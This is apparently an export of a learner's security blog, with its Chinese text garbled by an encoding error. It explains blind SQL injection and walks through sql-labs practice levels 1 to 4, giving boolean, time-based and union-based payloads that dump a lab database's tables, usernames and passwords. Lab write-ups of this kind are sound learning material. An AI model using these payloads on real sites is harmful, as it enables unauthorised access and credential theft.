        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ç›²æ³¨"><a href="#ä»€ä¹ˆæ˜¯ç›²æ³¨" class="headerlink" title="ä»€ä¹ˆæ˜¯ç›²æ³¨"></a>ä»€ä¹ˆæ˜¯ç›²æ³¨</h2><p>ç›²æ³¨å°±æ˜¯åœ¨sqlæ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œsqlè¯­å¥æ‰§è¡Œselectä¹‹åï¼Œå¯èƒ½ç”±äºç½‘ç«™æ–¹æ³•ä»£ç çš„é™åˆ¶æˆ–è€…apacheç­‰è§£æå™¨é…ç½®äº†ä¸å›æ˜¾æ•°æ®ï¼Œé€ æˆåœ¨selectæ•°æ®ä¹‹åä¸èƒ½å›æ˜¾åˆ°å‰ç«¯é¡µé¢ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªåˆ¤æ–­è¿‡ç¨‹ç§°ä¸ºç›²æ³¨ã€‚</p><p>ç®€å•ç†è§£å°±æ˜¯åœ¨å‰ç«¯é¡µé¢æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¸èƒ½è¿”å›sqlè¯­å¥æ‰§è¡Œé”™è¯¯çš„ä¿¡æ¯ï¼Œè¾“å…¥æ­£ç¡®å’Œé”™è¯¯è¿”å›çš„ä¿¡æ¯éƒ½æ˜¯ä¸€è‡´çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨é¡µé¢çš„æ­£å¸¸å’Œä¸æ­£å¸¸æ˜¾ç¤ºæ¥è¿›è¡Œsqlæ³¨å…¥ã€‚</p><h2 id="ç›²æ³¨çš„åˆ†ç±»"><a href="#ç›²æ³¨çš„åˆ†ç±»" class="headerlink" title="ç›²æ³¨çš„åˆ†ç±»"></a>ç›²æ³¨çš„åˆ†ç±»</h2><p>å¸ƒå°”ç›²æ³¨</p><p>æ—¶é—´ç›²æ³¨</p><h2 id="åˆ©ç”¨ç›²æ³¨çš„å‰ææ¡ä»¶"><a href="#åˆ©ç”¨ç›²æ³¨çš„å‰ææ¡ä»¶" class="headerlink" title="åˆ©ç”¨ç›²æ³¨çš„å‰ææ¡ä»¶"></a>åˆ©ç”¨ç›²æ³¨çš„å‰ææ¡ä»¶</h2><p>é¦–å…ˆé¡µé¢æ²¡æœ‰æ˜¾ç¤ºä½ï¼ˆå¦‚æœæœ‰æ˜¾ç¤ºä½å¯ä»¥é€‰æ‹©unionè”åˆæŸ¥è¯¢ï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰è¿”å›sqlè¯­å¥çš„æ‰§è¡Œé”™è¯¯ä¿¡æ¯ã€‚</p><h2 id="ç›²æ³¨çš„ä¼˜ç¼ºç‚¹"><a href="#ç›²æ³¨çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="ç›²æ³¨çš„ä¼˜ç¼ºç‚¹"></a>ç›²æ³¨çš„ä¼˜ç¼ºç‚¹</h2><p>ä¼˜ç‚¹ï¼šä¸éœ€è¦æ˜¾ç¤ºä½å’Œå‡ºé”™ä¿¡æ¯ã€‚</p><p>ç¼ºç‚¹ï¼šé€Ÿåº¦æ…¢ï¼Œè€—è´¹æ—¶é—´é•¿ï¼ˆå¯ä»¥ä½¿ç”¨bpç­‰å·¥å…·ï¼‰</p><h2 id="å¸ƒå°”ç±»å‹çš„ç›²æ³¨"><a href="#å¸ƒå°”ç±»å‹çš„ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç±»å‹çš„ç›²æ³¨"></a>å¸ƒå°”ç±»å‹çš„ç›²æ³¨</h2><ol><li>left(database(),1)&gt;â€™sâ€™     //left() å‡½æ•°</li></ol><p>database()æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼Œleft(a,b)ä»å·¦ä¾§æˆªå–açš„å‰bä½</p><ol start="2"><li> ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1 ),1,1))=101 â€“+          //substr()å‡½æ•°ï¼Œasciiå‡½æ•°()</li></ol><p>   substr(a,b,c)ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦ã€‚ascii()å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸ºasciiå€¼</p><ol start="3"><li><p>ascii(substr((select database()),1,1))=98</p></li><li><p>ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23           //ord()å‡½æ•°ï¼Œmid()å‡½æ•°</p><p>mid(a,b,c)ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½</p><p>ord()å‡½æ•°åŒascii(),å°†å­—ç¬¦è½¬ä¸ºasciiå€¼</p></li><li><p>regexpæ­£åˆ™æ³¨å…¥</p><p>ç”¨æ³•ä»‹ç»ï¼šselect user() regexp â€˜^[a-z]â€™;</p><p>æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ï¼Œuser()ç»“æœä¸ºrootï¼Œregexpä¸ºåŒ¹é…rootçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ç¬¬äºŒä½å¯ä»¥ç”¨select user() regexp â€˜^roâ€™ æ¥è¿›è¡Œã€‚</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514160206799.png" alt="image-20230514160206799"></p></li></ol><p>å½“æ­£ç¡®çš„æ—¶å€™æ˜¾ç¤ºç»“æœä¸º1ï¼Œä¸æ­£ç¡®çš„æ—¶å€™æ˜¾ç¤ºç»“æœä¸º0</p><p>6.likeåŒ¹é…æ³¨å…¥</p><p>å’Œä¸Šè¿°çš„æ­£åˆ™ç±»ä¼¼ï¼Œmysqlåœ¨åŒ¹é…çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨like è¿›è¡ŒåŒ¹é…ã€‚</p><p>ç”¨æ³•ï¼šselect user()  like â€˜ro%â€™</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514163811743.png" alt="image-20230514163811743"></p><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5)%23)    //ifåˆ¤æ–­è¯­å¥ï¼Œæ¡ä»¶ä¸ºå‡ï¼Œæ¡ä»¶ä¸ºå‡ï¼Œæ‰§è¡Œsleep</p><p>union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(â€˜msgâ€™,â€™by 5 secondsâ€™)),null)  </p><p>from (select database() as current) as tbl;</p><p>//benchmark(count,expr)ç”¨äºæµ‹è¯•å‡½æ•°çš„æ€§èƒ½ï¼Œå‚æ•°ä¸€ä¸ºæ¬¡æ•°ï¼ŒäºŒä¸ºè¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚å¯ä»¥è®©å‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œè¿”å›ç»“æœæ¯”å¹³æ—¶é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œåˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡çš„CPUèµ„æºã€‚</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514173225035.png" alt="image-20230514173225035"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labsé¶åœº</title>
      <link href="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="å‡ ä¸ªå¸¸ç”¨å‡½æ•°"><a href="#å‡ ä¸ªå¸¸ç”¨å‡½æ•°" class="headerlink" title="å‡ ä¸ªå¸¸ç”¨å‡½æ•°"></a>å‡ ä¸ªå¸¸ç”¨å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.version() --mysqlç‰ˆæœ¬</span><br><span class="line">2.user()    --æ•°æ®åº“ç”¨æˆ·å</span><br><span class="line">3.database() --æ•°æ®åº“å</span><br><span class="line">4.@@datadir  --æ•°æ®åº“è·¯å¾„</span><br><span class="line">5.@@version_compile_os --æ“ä½œç³»ç»Ÿ</span><br></pre></td></tr></table></figure><h3 id="ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"><a href="#ç”¨äºå°è¯•çš„é—­åˆè¯­å¥" class="headerlink" title="ç”¨äºå°è¯•çš„é—­åˆè¯­å¥"></a>ç”¨äºå°è¯•çš„é—­åˆè¯­å¥</h3><p>â€“+å¯ä»¥ç”¨ #æ›¿æ¢ï¼Œurlæäº¤è¿‡ç¨‹ä¸­urlç¼–ç åçš„#ä¸º%23ï¼Œ - å’Œ# ä¸ºæ³¨é‡Šç¬¦ï¼ŒæŠŠåé¢è¯­å¥æ³¨é‡Šæ‰ï¼Œä½¿å…¶æ— æ³•æ‰§è¡Œã€‚ç©ºæ ¼urlè½¬ä¹‰æˆ%20ï¼Œ  â€˜ è½¬ä¹‰æˆ%27</p><p>æœ‰æ—¶ç”¨â€“+ï¼Œè€Œä¸æ˜¯#çš„åŸå› æ˜¯,http æ— æ³•è§£é‡Š#ï¼Œæ‰€ä»¥ç”¨â€“+æ¥ä»£æ›¿</p><p>â€“+ä¸­èµ·åˆ°æ³¨é‡Šä½œç”¨å…¶å®æ˜¯â€“ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„ â€“ ä¼šå’Œåé¢çš„å†…å®¹è¿ä¸Šä»è€Œå¯¼è‡´sqlè¯­å¥å‡ºé”™ï¼Œæ‰€ä»¥æœ‰äº† + ä¼šè§£é‡Šä¸ºç©ºæ ¼ï¼Œä»è€Œé¿å…æŠ¥é”™</p><p>æ•…</p><p>â€“%20 &lt;==&gt; â€“+</p><h4 id="sql-labsé¶åœºless1"><a href="#sql-labsé¶åœºless1" class="headerlink" title="sql-labsé¶åœºless1"></a>sql-labsé¶åœºless1</h4><p>1.é¢˜ç›®æç¤ºè¾“å…¥IDè¿›è¡Œgetä¼ å‚ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªé¶åœºè²Œä¼¼æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæˆ‘ç”¨å¤§å†™IDè¿›è¡Œä¼ å‚æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾çš„ï¼Œåªæœ‰è¾“å…¥idæ‰å¯ä»¥ä¼ å‚ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ã€‚</p><p>â€˜ æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å°è¯•å•å¼•å·æ³¨å…¥ï¼Œçœ‹å›æ˜¾ä¿¡æ¯ï¼›å‘ç°æ˜¯å­—ç¬¦å‹åå°æ•°æ®åº“é€šè¿‡å•å¼•å·è¿›è¡Œé—­åˆ</span><br><span class="line">?id=1&#x27; </span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211409346.png" alt="image-20230717211409346"></p><p>2.å°è¯•ä½¿ç”¨ # æ³¨é‡Šä¸èµ·ä½œç”¨ã€‚é‡‡ç”¨%23æˆ–è€…â€“+æ³¨é‡Šéƒ½å¯ä»¥ï¼Œéœ€è¦æ³¨æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  --+</span><br><span class="line">?id=1&#x27; #</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211829588.png" alt="image-20230717211829588"></p><p>3.è¿›ä¸€æ­¥å°è¯• è¾“å…¥ id=1â€™ â€“+ å‘ç°å›æ˜¾æ­£å¸¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718204259099.png" alt="image-20230718204259099"></p><p>4.ç”¨order by åˆ¤æ–­è¯¥è¯­å¥æœ‰å‡ åˆ—æ•°æ® ?id=1â€™ order by 3 â€“+<br> order by 3 å›æ˜¾æ­£å¸¸ order by 4 æ˜¾ç¤ºé”™è¯¯ è¯æ˜æœ‰ä¸‰åˆ—æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+  æ­£å¸¸</span><br><span class="line">?id=1&#x27; order by 4 --+  æŠ¥é”™</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205559129.png" alt="image-20230718205559129"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205438777.png" alt="image-20230718205438777"></p><p>5.äºæ˜¯ä½¿ç”¨ å‡½æ•°æŸ¥è¯¢ï¼Œæ­¤æ—¶è¦å°†id=1æ”¹ä¸ºä¸€ä¸ªæ•°æ®åº“ä¸å­˜åœ¨çš„æ•°å€¼ æ¯”å¦‚-1ï¼Œç»™åé¢æŸ¥è¯¢è¯­å¥ç•™æ˜¾ç¤ºä½ã€‚æ­¤æ—¶æ³¨å…¥è¯­å¥ä¸ºï¼š </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205841661.png" alt="image-20230718205841661"></p><p>å¦‚å›¾å¯çŸ¥æ˜¾ç¤ºä½ä¸º2ï¼Œ3ä½ã€‚</p><p>6.ç„¶ååœ¨2ï¼Œ3ä½é€‰æ‹©ä¸€ä½æˆ–è€…ä¸¤ä½ æŸ¥è¯¢æ•°æ®åº“<br> é¦–å…ˆæŸ¥è¯¢æ•°æ®åº“åç§°<br> æŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1â€™ union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718210316321.png" alt="image-20230718210316321"></p><p>å¯ä»¥æŸ¥çœ‹åˆ° æ•°æ®åº“åç§°ä¸ºsecurity</p><p>7.ç»§ç»­æŸ¥çœ‹è¡¨å</p><p>é€šè¿‡group_concatå‡½æ•°å¼€å§‹æ‰‹å·¥æŠ¥ä»–çš„è¡¨åï¼›çœ‹çœ‹æ•°æ®åº“ä¸­éƒ½æœ‰å“ªäº›è¡¨</p><p><strong>information_schema.tables è¡¨ç¤ºå…ƒæ•°æ®ä¸‹çš„tablesè¡¨</strong></p><p><strong>where+æ¡ä»¶</strong></p><blockquote><p>group_concat(table_name)è¡¨ç¤ºå°†æŸ¥è¯¢åˆ°çš„ç»“æœè¿æ¥èµ·æ¥</p><p>ä¸‹æ–¹payloadçš„æ„æ€æ˜¯ï¼šæŸ¥è¯¢information)_schemaæ•°æ®åº“ä¸‹çš„tablesè¡¨ä¸”table_schemaå­—æ®µå†…å®¹æ˜¯securityçš„æ‰€æœ‰table_nameçš„å†…å®¹</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212438030.png" alt="image-20230718212438030"></p><p> å¯ä»¥è§åˆ°è¡¨åæœ‰emails,referers,uagents,users</p><p>8.å› ä¸ºsqlæ³¨å…¥ä¸»è¦æ˜¯æŸ¥çœ‹æ•°æ®åº“ä¸­æœ‰ç”¨ä¿¡æ¯ï¼Œè€Œè¿™ä¸ªusers è¿™ä¸ªè¡¨ çœ‹èµ·æ¥å­˜æœ‰æ•æ„Ÿä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ä»¬ç»§ç»­æŸ¥çœ‹users è¡¨ä¸­ä¿¡æ¯ã€‚æŸ¥çœ‹usersè¡¨ä¸­çš„åˆ—åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name =&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212951955.png" alt="image-20230718212951955"></p><p>å¯ä»¥æŸ¥çœ‹åˆ°userä¸­æœ‰ä¸‰ä¸ªåˆ—åid ã€usernameã€password</p><p>9.æœ€åæŸ¥æ‰¾è¯¥è¡¨ä¸­usenameã€passwordçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718213610162.png" alt="image-20230718213610162"></p><p>å¾—åˆ°æ‰€æœ‰çš„æ•°æ®ï¼Œæ³¨å…¥å®Œæˆ</p><h4 id="sql-labsé¶åœºless2"><a href="#sql-labsé¶åœºless2" class="headerlink" title="sql-labsé¶åœºless2"></a>sql-labsé¶åœºless2</h4><p>tipsï¼šå¯ä»¥æ‰“å¼€æ¯ä¸€å…³çš„æºç ï¼Œåœ¨è¯¥ä½ç½®æ·»åŠ ä¸€å¥ä»£ç æ–¹ä¾¿åšé¢˜åˆ†æï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo&quot;sqlé‡Œé¢æ‰§è¡Œçš„æ˜¯&quot;.$sql.&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225159607.png" alt="image-20230512225159607"></p><p>1.åˆ¤æ–­æ³¨å…¥ç±»å‹</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225353576.png" alt="image-20230512225353576"></p><p>å¯ä»¥çŸ¥é“æ˜¯æ•°å€¼å‹</p><p>2.åˆ¤æ–­å­—æ®µæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4 ä¸æ­£å¸¸</span><br><span class="line">?id=1 order by 3 æ­£å¸¸</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225530782.png" alt="image-20230512225530782"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225927074.png" alt="image-20230512225927074"></p><p>å¯ä»¥ç¡®å®šæœ‰ä¸‰åˆ—</p><p>3.åˆ¤æ–­å¯ä»¥å›æ˜¾çš„å­—æ®µæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513193541123.png" alt="image-20230513193541123"></p><p>4.åˆ¤æ–­æ•°æ®åº“åå’Œç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version()</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513194524358.png" alt="image-20230513194524358"></p><p>5.è·å–è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195104430.png" alt="image-20230513195104430"></p><p>6.è·å–åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195526249.png" alt="image-20230513195526249"></p><p>7.è·å–æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,username,password from security.users limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195823876.png" alt="image-20230513195823876"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195921714.png" alt="image-20230513195921714"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513200006154.png" alt="image-20230513200006154"></p><p>ç¬¬næ¡â€¦..ä¾æ¬¡ç±»æ¨limit nï¼Œ1</p><h4 id="sql-labsé¶åœºless3"><a href="#sql-labsé¶åœºless3" class="headerlink" title="sql-labsé¶åœºless3"></a>sql-labsé¶åœºless3</h4><p>ä»Šå¤©æµ…æµ…å¤ä¹ ä¸€ä¸‹</p><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œ</p><p>è¾“å…¥ï¼Ÿid=1 æ˜¾ç¤ºæ­£å¸¸ </p><p>â€‹     ï¼Ÿid=1â€™ ä¸æ­£å¸¸  è¯´æ˜å­˜åœ¨æ³¨å…¥</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513221043279.png" alt="image-20230513221043279"></p><p>ä¸Šå›¾æ˜¾ç¤ºï¼‰é™„è¿‘æœ‰è¯­æ³•é”™è¯¯ï¼Œæ‰€ä»¥æ„é€ è¯­å¥çš„æ—¶å€™éœ€è¦ç”¨ï¼‰è¿›è¡Œé—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) union select 1 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224322394.png" alt="image-20230513224322394"></p><p>ä¸Šé¢å›¾ç‰‡æ˜¾ç¤ºåˆ—æ•°ä¸æ­£ç¡®ï¼Œç›²çŒœè¯•è¯•ä¸‰åˆ—</p><p>2.åˆ¤æ–­å­—æ®µæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224510771.png" alt="image-20230513224510771"></p><p>å­—æ®µæ•°ä¸º4æ—¶æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º3</p><p>3.åˆ¤æ–­å›æ˜¾</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224733973.png" alt="image-20230513224733973"></p><p>4.æŸ¥çœ‹å½“å‰æ•°æ®åº“å’Œç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version() --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224934066.png" alt="image-20230513224934066"></p><p>5.æŸ¥çœ‹æ•°æ®åº“åç§°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1ï¼Œgroup_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513230621168.png" alt="image-20230513230621168"></p><p>6.æŸ¥çœ‹securityåº“é‡Œé¢çš„è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231141345.png" alt="image-20230513231141345"></p><p>7.è·å–åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231403867.png" alt="image-20230513231403867"></p><p>8.å­—æ®µæ•°æ®</p><p>è·å–åˆ°å­—æ®µåï¼Œæ ¹æ®å­—æ®µè·å–è¡¨é‡Œçš„æ•°æ®ã€‚å­—æ®µåä¹‹é—´å†åŠ ä¸Š*å­—ç¬¦çš„åå…­è¿›åˆ¶ï¼Œå¯ä»¥æŠŠè´¦å·å¯†ç éš”å¼€ï¼Œå®¹æ˜“åŒºåˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(username,0x2a,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231622174.png" alt="image-20230513231622174"></p><p>å®Œæˆï¼ï¼ï¼</p><h4 id="sql-labsé¶åœºless4"><a href="#sql-labsé¶åœºless4" class="headerlink" title="sql-labsé¶åœºless4"></a>sql-labsé¶åœºless4</h4><p>åœ¨å¤ä¹ ä¸€ä¸‹less4</p><p>less-3æ˜¯å•å¼•å·+å³æ‹¬å·ï¼Œless-4æ˜¯åŒå¼•å·+å³æ‹¬å·</p><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹</p><p>ä¸€å¼€å§‹ï¼Œï¼Ÿid=1 ç›´æ¥å›æ˜¾ç”¨æˆ·åå’Œå¯†ç ï¼Œ</p><p>â€‹              ï¼Ÿid=1â€™ ä¹Ÿæ˜¯ç›´æ¥å›æ˜¾ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513235842630.png" alt="image-20230513235842630"></p><p>åœ¨å°è¯•ä¸€ä¸‹åˆ«çš„ç¬¦å·</p><p>?id=1â€  å‡ºç°æŠ¥é”™ä¿¡æ¯</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000027873.png" alt="image-20230514000027873"></p><p>é”™è¯¯æç¤ºæ˜¯ã€â€1â€â€) LIMIT 0,1ã€‘ï¼Œå»æ‰è‡ªå·±è¾“å…¥çš„ä¸€ä¸ªåŒå¼•å·åå¯ä»¥çœ‹å‡ºè¿˜æœ‰ä¸¤ä¸ªåŒå¼•å·å’Œä¸€ä¸ªå³æ‹¬å·ï¼Œç”±æ­¤åˆ¤å¯æ¨å‡ºsqlæ³¨å…¥æ˜¯ç”±åŒå¼•å·å’Œå³æ‹¬å·å’Œèµ·æ¥çš„é—­åˆæ¨¡å¼ã€‚</p><p>2.æŸ¥å­—æ®µå</p><p>è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 4 --+</span><br></pre></td></tr></table></figure><p>åï¼Œæç¤ºè¶…å‡ºåˆ—æ•°ï¼Œåˆ™å°è¯•æŠŠ4æ”¹æˆ3ï¼Œå‘ç°æ— 